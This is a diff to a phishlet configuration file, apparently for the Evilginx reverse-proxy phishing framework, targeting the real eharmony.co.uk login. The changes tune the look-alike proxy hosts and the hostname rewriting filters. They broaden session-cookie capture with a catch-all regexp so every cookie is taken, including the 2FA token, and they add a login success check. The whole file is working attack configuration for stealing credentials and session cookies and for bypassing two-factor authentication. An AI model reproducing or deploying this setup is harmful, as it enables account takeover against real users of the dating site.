@@ -1,16 +1,19 @@
 author: '@maliondev'
 min_ver: '3.3.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.co.uk', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.co.uk', session: true, is_login: true, auto_filter: false}
-  - {phish_sub: 'tms', orig_sub: 'tms', domain: 'eharmony.co.uk', session: false, is_landing: false, auto_filter: false}  # - {phish_sub: 'login', orig_sub: 'www', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: fal>
-sub_filters:
-  - {triggers_on: 'www.eharmony.co.uk', orig_sub: 'www', domain: 'eharmony.co.uk', search: '{hostname_regexp}', replace>  - {triggers_on: 'www.eharmony.co.uk', orig_sub: 'tms', domain: 'eharmony.co.uk', search: '{hostname_regexp}', replace>
+   - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.co.uk', session: true, is_landing: true, is_login: true, auto_filter: true}
+  #- {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.co.uk', session: true, is_login: true, auto_filter: false}
+   - {phish_sub: 'tms', orig_sub: 'tms', domain: 'eharmony.co.uk', session: false, is_landing: false, auto_filter: false}
+    # - {phish_sub: 'login', orig_sub: 'www', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: false}
+sub_filters: 
+ - {triggers_on: 'www.eharmony.co.uk', orig_sub: 'www', domain: 'eharmony.co.uk', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ - {triggers_on: 'www.eharmony.co.uk', orig_sub: 'tms', domain: 'eharmony.co.uk', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
 auth_tokens:
   - domain: '.eharmony.co.uk'
-    keys: ['2FA_UV']
+    keys: ['2FA_UV', '.*,regexp']
   - domain: 'www.eharmony.co.uk'
-    keys: ['SESSION', 'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef']
+    keys: ['SESSION', 'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef', '.*,regexp']
 
 credentials:
   username:
@@ -24,4 +27,4 @@ credentials:
 login:
   domain: 'www.eharmony.co.uk'
   path: '/login'
-    
+  success_status: '200'
